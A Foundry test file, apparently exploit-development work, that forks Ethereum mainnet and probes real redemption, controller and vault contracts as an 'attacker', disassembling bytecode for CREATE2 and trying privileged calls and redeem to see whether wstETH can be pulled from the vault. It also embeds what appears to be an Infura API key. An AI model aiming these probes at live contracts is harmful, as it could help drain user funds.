// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Create2Exploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_LocateCreate2InRedemption1() public view {
        console.log("=== LOCATING CREATE2 IN REDEMPTION_1 ===\n");

        bytes memory code = REDEMPTION_1.code;

        console.log("CREATE2 locations and context:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf5) { // CREATE2
                console.log("\nCREATE2 at offset:", i);

                // Look for PUSH around it
                console.log("Context (50 bytes before):");
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    uint8 op = uint8(code[j]);
                    if (op == 0x54) console.log(j, "SLOAD");
                    if (op == 0x33) console.log(j, "CALLER");
                    if (op >= 0x60 && op <= 0x65) {
                        uint8 size = op - 0x5f;
                        uint256 val = 0;
                        for (uint k = 0; k < size && j + 1 + k < code.length; k++) {
                            val = val << 8 | uint8(code[j + 1 + k]);
                        }
                        if (val < 100) {
                            console.log(j, "PUSH slot:", val);
                        }
                    }
                }
            }
        }
    }

    function test_AnalyzeBurnTarget() public view {
        console.log("=== ANALYZING BURN TARGET AT 3552 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // The CALL at 3552 calls burn(uint256) - selector 0x42966c68
        // Need to find what address it calls

        console.log("Looking for target address before CALL 3552:");

        // Trace back to find the address
        for (uint i = 3350; i < 3560 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x30) console.log(i, "ADDRESS");
            if (op >= 0x60 && op <= 0x65) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (val < 20) {
                    console.log(i, "PUSH small:", val);
                }
            }
            if (op == 0x73) { // PUSH20
                uint256 val = 0;
                for (uint j = 0; j < 20 && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (val != type(uint160).max) {
                    console.log(i, "PUSH20:");
                    console.log("  ", address(uint160(val)));
                }
            }
        }

        // Check storage slots used
        console.log("\nChecking what storage slot 3 contains:");
        bytes32 slot3 = vm.load(REDEMPTION_1, bytes32(uint256(3)));
        console.logBytes32(slot3);
        address addr3 = address(uint160(uint256(slot3)));
        if (addr3.code.length > 0) {
            console.log("Slot 3 is contract:", addr3);
        }
    }

    function test_CheckRCFunctionSelectors() public view {
        console.log("=== ANALYZING RC FUNCTION SELECTORS ===\n");

        // Try to identify what each RC selector does
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(0xb2118a8d); // Looks like setRedemption or similar
        sels[1] = bytes4(0x1fe923d3);
        sels[2] = bytes4(0x2ab60045);
        sels[3] = bytes4(0x2d88af4a);
        sels[4] = bytes4(0x578063c5);
        sels[5] = bytes4(0x93d5f4c5);
        sels[6] = bytes4(0x9fd0506d);
        sels[7] = bytes4(0xa5956078);
        sels[8] = bytes4(0x411557d1);
        sels[9] = bytes4(0x04824e70);

        // Compare with known signatures
        console.log("Comparing with known function signatures:\n");

        bytes4 setRedemption = bytes4(keccak256("setRedemption(address)"));
        bytes4 addRedemption = bytes4(keccak256("addRedemption(address)"));
        bytes4 registerRedemption = bytes4(keccak256("registerRedemption(address)"));
        bytes4 setVault = bytes4(keccak256("setVault(address)"));
        bytes4 setAsset = bytes4(keccak256("setAsset(address)"));
        bytes4 withdraw = bytes4(keccak256("withdraw(address,uint256)"));
        bytes4 execute = bytes4(keccak256("execute(address,bytes)"));
        bytes4 pause = bytes4(keccak256("pause()"));
        bytes4 unpause = bytes4(keccak256("unpause()"));
        bytes4 claim = bytes4(keccak256("claim(uint256)"));

        console.log("setRedemption(address):");
        console.logBytes4(setRedemption);
        console.log("addRedemption(address):");
        console.logBytes4(addRedemption);
        console.log("registerRedemption(address):");
        console.logBytes4(registerRedemption);
        console.log("setVault(address):");
        console.logBytes4(setVault);
        console.log("setAsset(address):");
        console.logBytes4(setAsset);
        console.log("withdraw(address,uint256):");
        console.logBytes4(withdraw);
        console.log("execute(address,bytes):");
        console.logBytes4(execute);
        console.log("pause():");
        console.logBytes4(pause);
        console.log("unpause():");
        console.logBytes4(unpause);
        console.log("claim(uint256):");
        console.logBytes4(claim);

        // Check sels against these
        for (uint i = 0; i < sels.length; i++) {
            console.log("\nSel:");
            console.logBytes4(sels[i]);
            if (sels[i] == setRedemption) console.log("MATCH: setRedemption");
            if (sels[i] == addRedemption) console.log("MATCH: addRedemption");
            if (sels[i] == registerRedemption) console.log("MATCH: registerRedemption");
            if (sels[i] == setVault) console.log("MATCH: setVault");
            if (sels[i] == execute) console.log("MATCH: execute");
        }
    }

    function test_TryRCFunctions() public {
        console.log("=== TRYING RC FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18, "wstETH");

        vm.startPrank(attacker);

        // Try various RC functions to see what they do
        console.log("\nTrying RC functions as attacker:");

        // Try 0xb2118a8d
        (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSelector(bytes4(0xb2118a8d), attacker)
        );
        console.log("0xb2118a8d(attacker):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Try 0x1fe923d3
        (bool s2, bytes memory d2) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSelector(bytes4(0x1fe923d3), attacker)
        );
        console.log("0x1fe923d3(attacker):", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        // Try calling redeem directly on RC
        (bool s3, bytes memory d3) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s3);
        if (!s3 && d3.length >= 4) {
            console.logBytes4(bytes4(d3));
        }

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH:", attackerBal);
    }

    function test_InvestigateSalt() public view {
        console.log("=== INVESTIGATING CREATE2 SALT PATTERNS ===\n");

        // The hint about "proxy attacker owns" might involve CREATE2
        // If salt includes user data, attacker might predict address

        bytes memory code = REDEMPTION_1.code;

        // Find what provides salt for CREATE2
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf5) { // CREATE2
                console.log("CREATE2 at:", i);

                // Check stack layout before CREATE2
                // CREATE2 (value, offset, size, salt)
                // Salt is typically pushed shortly before
                console.log("Looking for salt source:");

                for (uint j = (i > 100 ? i - 100 : 0); j < i; j++) {
                    uint8 op = uint8(code[j]);
                    if (op == 0x33) console.log(j, "CALLER - might be salt!");
                    if (op == 0x35) console.log(j, "CALLDATALOAD - user input as salt?");
                    if (op == 0x20) console.log(j, "SHA3/KECCAK256");
                }
            }
        }
    }

    function test_CheckCreate2Addresses() public {
        console.log("=== CHECKING IF ATTACKER CAN PREDICT CREATE2 ADDRESS ===\n");

        // If REDEMPTION_1 uses CREATE2 with user-controlled salt,
        // attacker can pre-compute address and deploy their own code there

        // Try to trigger a CREATE2 operation
        deal(IAU, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Try redeem which might create a proxy
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem result:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();
    }
}
